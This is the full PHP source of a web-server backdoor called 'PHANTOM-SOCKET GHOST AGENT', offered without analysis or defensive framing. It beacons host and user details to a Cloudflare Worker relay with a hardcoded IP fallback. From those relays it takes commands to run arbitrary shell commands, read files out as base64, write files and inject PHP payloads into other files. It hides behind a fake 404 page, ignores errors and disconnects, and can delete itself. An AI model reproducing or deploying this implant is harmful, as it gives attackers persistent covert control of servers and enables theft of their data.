<?php
/**
 * PHANTOM-SOCKET V3.1 — GHOST AGENT (PHP)
 * GHOST PROTOCOL: CLOUDFLARE WORKER BRAIN
 * 
 * Version: v3.1-ghost-cf
 * Principal Systems Engineer: "The cloud is our backbone. Invisible, persistent, and distributed."
 */

error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

/**
 * CONFIGURATION & SECURITY
 */
$GHOST_CONFIG = array(
    'primary_relay'  => 'https://gs-oyensc.botoyen001.workers.dev',
    'fallback_relay' => 'http://13.213.138.250:8443',
    'auth_key'       => 'PREDATOR-X-2026-KINETIC-PRODUCTION',
    'agent_id'       => md5(php_uname('n') . get_current_user()),
    'ua'             => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'poll_interval'  => 30
);

/**
 * RELAY HEALTH CHECK
 */
function ghost_check_relay($url) {
    $ch = curl_init($url . '/health');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200);
}

/**
 * CLOUDFLARE WORKER REQUEST
 */
function ghost_request($endpoint, $data = null) {
    global $GHOST_CONFIG;
    
    // Choose relay
    static $active_relay = null;
    if ($active_relay === null) {
        if (ghost_check_relay($GHOST_CONFIG['primary_relay'])) {
            $active_relay = $GHOST_CONFIG['primary_relay'];
        } else {
            $active_relay = $GHOST_CONFIG['fallback_relay'];
        }
    }

    $url = $active_relay . $endpoint;
    $headers = array(
        "X-Auth: " . $GHOST_CONFIG['auth_key'],
        "X-Ghost-Agent: " . $GHOST_CONFIG['agent_id'],
        "User-Agent: " . $GHOST_CONFIG['ua']
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    if ($data) {
        $payload = json_encode($data);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        $headers[] = "Content-Type: application/json";
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($res, true);
}

/**
 * CAPABILITY: EXEC COMMAND
 */
function ghost_exec($cmd) {
    $out = '';
    ob_start();
    if (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } elseif (function_exists('exec')) {
        $tmp = array(); exec($cmd, $tmp); echo implode("\n", $tmp);
    }
    return ob_get_clean();
}

/**
 * CAPABILITY: FILE OPERATIONS
 */
function ghost_read_file($path) {
    if (!file_exists($path)) return "ERROR: NO_FILE: $path";
    return base64_encode(@file_get_contents($path));
}

function ghost_write_file($path, $b64_data) {
    if (!file_exists($path)) return "ERROR: NO_FILE_DROP: $path";
    return @file_put_contents($path, base64_decode($b64_data)) !== false ? "SUCCESS" : "ERROR";
}

function ghost_inject_php($path, $b64_payload, $position = 'append') {
    if (!file_exists($path)) return "ERROR: NO_FILE: $path";
    $content = @file_get_contents($path);
    $payload = base64_decode($b64_payload);
    if ($position === 'prepend') {
        $content = $payload . "\n" . $content;
    } else {
        $content .= "\n" . $payload;
    }
    return @file_put_contents($path, $content) !== false ? "SUCCESS" : "ERROR";
}

/**
 * MAIN LOOP
 */
function ghost_main() {
    global $GHOST_CONFIG;
    
    while (true) {
        // Check-in
        $res = ghost_request("/checkin", array(
            "id" => $GHOST_CONFIG['agent_id'],
            "hostname" => php_uname('n'),
            "user" => get_current_user(),
            "os" => php_uname('s'),
            "php_version" => PHP_VERSION,
            "timestamp" => time()
        ));

        // Process Commands
        if ($res && !empty($res['commands'])) {
            foreach ($res['commands'] as $cmd) {
                $task_id = $cmd['id'];
                $payload = $cmd['payload'];
                $args = isset($cmd['args']) ? $cmd['args'] : array();
                
                $output = "";
                switch ($payload) {
                    case 'exec': $output = ghost_exec($args['cmd']); break;
                    case 'read': $output = ghost_read_file($args['path']); break;
                    case 'write': $output = ghost_write_file($args['path'], $args['data']); break;
                    case 'inject': $output = ghost_inject_php($args['path'], $args['data'], isset($args['pos']) ? $args['pos'] : 'append'); break;
                    case 'cleanup': @unlink(__FILE__); exit();
                    default: $output = ghost_exec($payload); // Direct shell command
                }

                // Send result back
                ghost_request("/result", array(
                    "agent_id" => $GHOST_CONFIG['agent_id'],
                    "command_id" => $task_id,
                    "output" => base64_encode($output),
                    "timestamp" => time()
                ));
            }
        }

        sleep($GHOST_CONFIG['poll_interval']);
    }
}

// Entry Point
if ((php_sapi_name() === 'cli' && realpath($_SERVER['SCRIPT_FILENAME']) === realpath(__FILE__)) || isset($_GET['start'])) {
    ghost_main();
} else {
    header("HTTP/1.1 404 Not Found");
    echo "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
}
